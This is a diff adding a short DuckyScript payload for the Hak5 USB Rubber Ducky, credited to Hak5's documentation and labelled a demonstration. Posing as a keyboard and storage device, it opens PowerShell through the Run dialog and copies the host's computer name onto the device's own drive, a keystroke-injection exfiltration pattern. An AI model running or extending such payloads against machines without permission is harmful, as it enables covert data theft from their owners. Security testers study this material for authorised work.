@@ -1,0 +1,17 @@
+
+REM_BLOCK
+    Credits:    Hak5
+    Website:    https://docs.hak5.org/
+    Source:     https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference#exfiltration
+
+    This piece of code is for demonstration purposes only; it needs to be adjusted.
+END_REM
+
+
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;
+STRINGLN echo $env:computername >> $m:\computer_names.txt"
+
